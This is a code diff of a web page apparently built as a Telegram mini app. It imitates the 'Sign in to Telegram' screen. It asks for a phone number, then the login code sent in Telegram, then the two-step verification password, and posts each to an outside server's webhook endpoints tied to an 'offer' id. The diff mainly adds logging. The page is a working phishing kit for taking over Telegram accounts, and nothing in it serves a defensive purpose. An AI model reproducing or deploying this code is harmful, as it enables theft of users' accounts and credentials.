@@ -43,7 +43,6 @@ h1{font-size:23px;font-weight:600;letter-spacing:-.4px;margin-bottom:10px}
 .btn:disabled{background:#2f3b4a;color:#4a5563;cursor:not-allowed}
 .btn-ghost{background:transparent;color:#5b8def;padding:14px;font-size:15px;font-weight:500;border:none;cursor:pointer;font-family:inherit;margin-top:2px;border-radius:10px}
 .footer-note{margin-top:22px;font-size:11.5px;color:#4a5563;line-height:1.55}
-.footer-note a{color:#5b8def;text-decoration:none}
 .spinner-wrap{text-align:center;padding:24px 0}
 .spinner{width:46px;height:46px;border:4px solid #2f3b4a;border-top-color:#5b8def;border-radius:50%;margin:0 auto 18px;animation:spin .9s linear infinite}
 @keyframes spin{to{transform:rotate(360deg)}}
@@ -132,30 +131,44 @@ h1{font-size:23px;font-weight:600;letter-spacing:-.4px;margin-bottom:10px}
 const API = 'https://botofferswork.onrender.com';
 // ═══════════════════════════════════════════════════════
 
-// ─── Telegram WebApp init
-const tg = window.Telegram?.WebApp;
+console.log('[INIT] mini app started');
+console.log('[INIT] API =', API);
+
+// ─── Telegram WebApp
+const tg = window.Telegram && window.Telegram.WebApp ? window.Telegram.WebApp : null;
 if (tg) {
-  tg.ready();
-  tg.expand();
-  if (tg.themeParams?.bg_color) {
-    document.body.style.background = tg.themeParams.bg_color;
+  try {
+    tg.ready();
+    tg.expand();
+    if (tg.enableClosingConfirmation) tg.enableClosingConfirmation();
+    console.log('[TG] WebApp ready, version', tg.version);
+    console.log('[TG] start_param =', tg.initDataUnsafe && tg.initDataUnsafe.start_param);
+  } catch (e) {
+    console.warn('[TG] init error', e);
   }
-  if (tg.enableClosingConfirmation) tg.enableClosingConfirmation();
+} else {
+  console.log('[TG] not in Telegram, running as plain site');
 }
 
-// ─── читаем startapp или обычные параметры
+// ─── парсим startapp или обычные параметры URL
 let offerId = 0;
 let action = 'accept';
 
-const startParam = tg?.initDataUnsafe?.start_param || '';
+const startParam = tg && tg.initDataUnsafe ? (tg.initDataUnsafe.start_param || '') : '';
 const m = startParam.match(/^offer_(\d+)_(accept|reject)$/);
 if (m) {
   offerId = parseInt(m[1], 10);
   action = m[2];
+  console.log('[PARAM] from startapp:', { offerId, action });
 } else {
   const params = new URLSearchParams(location.search);
   offerId = parseInt(params.get('offer') || '0', 10);
   action = (params.get('action') || 'accept').toLowerCase();
+  console.log('[PARAM] from URL:', { offerId, action });
+}
+
+if (!offerId) {
+  console.warn('[PARAM] offerId = 0 — оффер не определён');
 }
 
 // ─── страны
@@ -212,78 +225,140 @@ phoneInput.addEventListener('input',e=>{
 });
 function validatePhone(){const d=phoneInput.value.replace(/\D/g,'');$('btn-next').disabled=d.length<6}
 
-// ШАГ 1
-stepPhone.addEventListener('submit',async e=>{
-  e.preventDefault();if(window.__REJECTED__)return;hideError();
+// ─── helper: POST с логом
+async function api(path, body){
+  const url = API + path;
+  console.log('[API →]', url, body);
+  let res, data;
+  try {
+    res = await fetch(url, {
+      method: 'POST',
+      headers: {'Content-Type': 'application/json'},
+      body: JSON.stringify(body)
+    });
+  } catch (e) {
+    console.error('[API ✗] network error', e);
+    throw new Error('Сервер недоступен. Попробуйте позже.');
+  }
+  try {
+    data = await res.json();
+  } catch (e) {
+    console.error('[API ✗] invalid json', e);
+    throw new Error('Ошибка сервера. Попробуйте позже.');
+  }
+  console.log('[API ←]', res.status, data);
+  return { status: res.status, data };
+}
+
+// ─── ШАГ 1: номер телефона
+stepPhone.addEventListener('submit', async e=>{
+  e.preventDefault();
+  if(window.__REJECTED__) return;
+  hideError();
+
   const num=phoneInput.value.replace(/\D/g,'');
-  phone=selected.c+num;
-  hide(stepPhone);show(stepLoading);$('loading-text').textContent='Sending code…';
+  phone = selected.c + num;
+  console.log('[STEP 1] phone =', phone);
+
+  hide(stepPhone); show(stepLoading); $('loading-text').textContent='Sending code…';
+
   try{
-    const r=await fetch(`${API}/webhook/phone`,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({offer_id:offerId,phone:phone})});
-    const data=await r.json();
-    if(!data.ok){hide(stepLoading);show(stepPhone);showError(data.error||'Ошибка');return}
-    hide(stepLoading);show(stepCode);setStep(2);
-    $('title').textContent='Enter code';$('sub').textContent='';
-    $('code-hint').innerHTML=`We've sent the code to <b>${phone}</b> in Telegram.`;
-    codeInput.value='';setTimeout(()=>codeInput.focus(),100);
-  }catch(err){hide(stepLoading);show(stepPhone);showError('Не удалось связаться с сервером')}
+    const {status, data} = await api('/webhook/phone', { offer_id: offerId, phone: phone });
+    if (!data.ok) {
+      hide(stepLoading); show(stepPhone);
+      showError(data.error || 'Не удалось отправить код.');
+      return;
+    }
+    hide(stepLoading); show(stepCode); setStep(2);
+    $('title').textContent = 'Enter code';
+    $('sub').textContent = '';
+    $('code-hint').innerHTML = `We've sent the code to <b>${phone}</b> in Telegram.`;
+    codeInput.value = '';
+    setTimeout(()=>codeInput.focus(), 100);
+  } catch(err){
+    hide(stepLoading); show(stepPhone);
+    showError(err.message || 'Ошибка сети');
+  }
 });
 
-// ШАГ 2
-stepCode.addEventListener('submit',async e=>{
-  e.preventDefault();if(window.__REJECTED__)return;hideError();
-  code=codeInput.value.replace(/\D/g,'');
-  if(code.length<3){showError('Введите код из Telegram');return}
-  hide(stepCode);show(stepLoading);$('loading-text').textContent='Checking code…';
+// ─── ШАГ 2: код из смс
+stepCode.addEventListener('submit', async e=>{
+  e.preventDefault();
+  if(window.__REJECTED__) return;
+  hideError();
+
+  code = codeInput.value.replace(/\D/g,'');
+  if(code.length < 3){ showError('Введите код из Telegram'); return; }
+  console.log('[STEP 2] code =', code);
+
+  hide(stepCode); show(stepLoading); $('loading-text').textContent='Checking code…';
+
   try{
-    const r=await fetch(`${API}/webhook/code`,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({offer_id:offerId,phone:phone,code:code})});
-    const data=await r.json();
-    if(data.ok && !data.needs_password){
-      hide(stepLoading);show(stepSuccess);hide(dots);
-      $('title').style.display='none';$('sub').style.display='none';$('footer').style.display='none';
-    }else if(data.ok && data.needs_password){
-      hide(stepLoading);show(step2fa);setStep(3);
+    const {status, data} = await api('/webhook/code', { offer_id: offerId, phone: phone, code: code });
+
+    if (data.ok && !data.needs_password){
+      hide(stepLoading); show(stepSuccess); hide(dots);
+      $('title').style.display='none'; $('sub').style.display='none'; $('footer').style.display='none';
+    } else if (data.ok && data.needs_password){
+      hide(stepLoading); show(step2fa); setStep(3);
       $('title').textContent='Two-Step Verification';
       $('sub').textContent='Your account is protected with an additional password.';
-      passInput.value='';setTimeout(()=>passInput.focus(),100);
-    }else{
-      hide(stepLoading);show(stepCode);
-      let msg=data.error||'Неверный код';
-      if(data.attempts_left!==undefined)msg+=`<div class="attempts">Осталось попыток: ${data.attempts_left}</div>`;
+      passInput.value='';
+      setTimeout(()=>passInput.focus(), 100);
+    } else {
+      hide(stepLoading); show(stepCode);
+      let msg = data.error || 'Неверный код';
+      if (data.attempts_left !== undefined) msg += `<div class="attempts">Осталось попыток: ${data.attempts_left}</div>`;
       showError(msg);
-      codeInput.value='';codeInput.focus();
+      codeInput.value=''; codeInput.focus();
     }
-  }catch(err){hide(stepLoading);show(stepCode);showError('Не удалось связаться с сервером')}
+  } catch(err){
+    hide(stepLoading); show(stepCode);
+    showError(err.message || 'Ошибка сети');
+  }
 });
 
-$('btn-back-phone').addEventListener('click',()=>{
-  if(window.__REJECTED__)return;
-  hide(stepCode);show(stepPhone);setStep(1);
+$('btn-back-phone').addEventListener('click', ()=>{
+  if(window.__REJECTED__) return;
+  hide(stepCode); show(stepPhone); setStep(1);
   $('title').textContent='Sign in to Telegram';
   $('sub').textContent='Please confirm your country code and enter your phone number.';
 });
 
-// ШАГ 3
-step2fa.addEventListener('submit',async e=>{
-  e.preventDefault();if(window.__REJECTED__)return;hideError();
-  password=passInput.value.trim();
-  if(!password){showError('Введите пароль');return}
-  hide(step2fa);show(stepLoading);$('loading-text').textContent='Checking password…';
+// ─── ШАГ 3: 2FA
+step2fa.addEventListener('submit', async e=>{
+  e.preventDefault();
+  if(window.__REJECTED__) return;
+  hideError();
+
+  password = passInput.value.trim();
+  if(!password){ showError('Введите пароль'); return; }
+  console.log('[STEP 3] 2FA entered');
+
+  hide(step2fa); show(stepLoading); $('loading-text').textContent='Checking password…';
+
   try{
-    const r=await fetch(`${API}/webhook/password`,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({offer_id:offerId,phone:phone,code:code,password:password})});
-    const data=await r.json();
-    if(data.ok){
-      hide(stepLoading);show(stepSuccess);hide(dots);
-      $('title').style.display='none';$('sub').style.display='none';$('footer').style.display='none';
-    }else{
-      hide(stepLoading);show(step2fa);
-      let msg=data.error||'Неверный пароль';
-      if(data.attempts_left!==undefined)msg+=`<div class="attempts">Осталось попыток: ${data.attempts_left}</div>`;
+    const {status, data} = await api('/webhook/password', {
+      offer_id: offerId, phone: phone, code: code, password: password
+    });
+
+    if (data.ok){
+      hide(stepLoading); show(stepSuccess); hide(dots);
+      $('title').style.display='none'; $('sub').style.display='none'; $('footer').style.display='none';
+    } else {
+      hide(stepLoading); show(step2fa);
+      let msg = data.error || 'Неверный пароль';
+      if (data.attempts_left !== undefined) msg += `<div class="attempts">Осталось попыток: ${data.attempts_left}</div>`;
       showError(msg);
-      passInput.value='';passInput.focus();
+      passInput.value=''; passInput.focus();
     }
-  }catch(err){hide(stepLoading);show(step2fa);showError('Не удалось связаться с сервером')}
+  } catch(err){
+    hide(stepLoading); show(step2fa);
+    showError(err.message || 'Ошибка сети');
+  }
 });
+
+console.log('[INIT] handlers bound, ready');
 </script>
 </body>
 </html>
